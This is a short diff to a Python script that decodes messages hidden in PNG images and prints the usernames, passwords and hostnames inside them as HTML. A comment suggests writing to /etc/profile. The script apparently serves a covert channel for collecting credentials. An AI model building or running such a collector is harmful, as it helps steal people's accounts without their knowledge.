@@ -33,16 +33,18 @@ def getdetails(msg):
 
 #Main Function
 decode_dir = path.expanduser("images/")
+x=""
 for infile in glob.glob(decode_dir+"*.png"):
 	msg = decode(infile)
 	if isvalidformat(msg):
 		login = getdetails(msg)
-		print "<b>Username</b> :", login[1], "<br/><b>Password</b> :", login[0], "<br/><b>Hostname:</b>",login[2],"<br/><br/>"
-	remove(infile)
+		x+= "<b>Username</b> :" + login[1] + "<br/><b>Password</b> :" + login[0] + "<br/><b>Hostname:</b>" + login[2] + "<br/><br/>"
 
 f = open('updated.txt','w+')			# Change file to /etc/profile
 f.write(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
 f.close()
+
+print x
 
 
 
